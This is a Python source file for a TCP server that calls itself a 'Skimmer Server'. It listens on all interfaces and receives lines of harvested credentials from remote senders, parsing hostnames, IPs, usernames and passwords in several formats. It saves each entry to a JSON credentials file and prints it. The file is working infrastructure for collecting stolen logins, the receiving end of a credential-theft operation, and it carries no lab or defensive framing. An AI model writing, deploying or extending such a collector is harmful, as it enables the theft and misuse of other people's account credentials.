import socket
import json
import threading
import re
from datetime import datetime
import os

HOST = '0.0.0.0'
PORT = int(os.environ.get('SKIMMER_PORT', 9999))
CREDS_FILE = os.environ.get('CREDS_FILE', '/data/creds.json')

_file_lock = threading.Lock()

TAG_RE = re.compile(r'^\[(\w+)\]\s*')


def save_cred(ip, line):
    raw = line.strip()
    if not raw:
        return

    tag = "UNKNOWN"
    m = TAG_RE.match(raw)
    if m:
        tag = m.group(1)
        raw = raw[m.end():]

    if raw.startswith('{'):
        try:
            parsed = json.loads(raw)
            entry = {
                "timestamp": datetime.utcnow().isoformat(),
                "ip": ip,
                "hostname": parsed.get("hostname", "unknown"),
                "username": parsed.get("username", ""),
                "password": parsed.get("password", ""),
                "source": tag,
            }
        except json.JSONDecodeError:
            entry = None
    else:
        entry = None

    if entry is None:
        parts = raw.split(':', 3)
        if len(parts) == 4:
            hostname, embedded_ip, user, passwd = parts
        elif len(parts) == 3:
            hostname, user, passwd = parts
            embedded_ip = None
        elif len(parts) == 2:
            hostname = "unknown"
            user, passwd = parts
            embedded_ip = None
        else:
            hostname, user, passwd = "unknown", "unknown", raw
            embedded_ip = None

        entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "ip": embedded_ip or ip,
            "hostname": hostname,
            "username": user,
            "password": passwd,
            "source": tag,
        }

    with _file_lock:
        try:
            with open(CREDS_FILE, 'r') as f:
                data = json.load(f)
        except Exception:
            data = []
        data.append(entry)
        with open(CREDS_FILE, 'w') as f:
            json.dump(data, f, indent=2)


def handle_client(conn, addr):
    ip = addr[0]
    try:
        conn.settimeout(5)
        chunks = []
        while True:
            try:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
            except socket.timeout:
                break
        data = b''.join(chunks).decode(errors='replace')
        for line in data.strip().splitlines():
            if line.strip():
                print(f"[!] Credentials from {ip}: {line.strip()}", flush=True)
                save_cred(ip, line)
    except Exception as e:
        print(f"[!] Error from {ip}: {e}", flush=True)
    finally:
        conn.close()


def main():
    print(f"[+] Skimmer Server listening on {HOST}:{PORT}", flush=True)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(64)
        while True:
            conn, addr = s.accept()
            t = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
            t.start()


if __name__ == "__main__":
    main()
